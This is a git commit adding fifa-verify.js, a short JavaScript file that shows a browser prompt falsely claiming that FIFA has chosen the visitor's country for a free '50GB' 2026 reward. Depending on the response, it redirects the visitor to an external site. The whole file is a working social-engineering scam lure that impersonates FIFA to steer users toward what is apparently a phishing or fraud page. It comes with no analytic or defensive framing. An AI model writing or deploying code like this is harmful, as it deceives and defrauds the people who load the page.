075cd657a5298552b0a59639db82a5c8d55abdff
itidetidre-glitch <itidetidre@gmail.com>
2026-07-19 13:26:10 -0500

    Create fifa-verify.js

---
+++ fifa-verify.js
@@ -0,0 +1,5 @@
+var password = 'GET 50GB NOW'
+password=prompt('FIFA: Congratulations your country is among the selected countries to benefit from this FIFA 2026 Reward, , press OK to get 50GB Now ','GET 50GB NOW');
+if (password != 'GET 50GB NOW') {
+location.href='https://mmaifot.com/fifa-2026';
+}
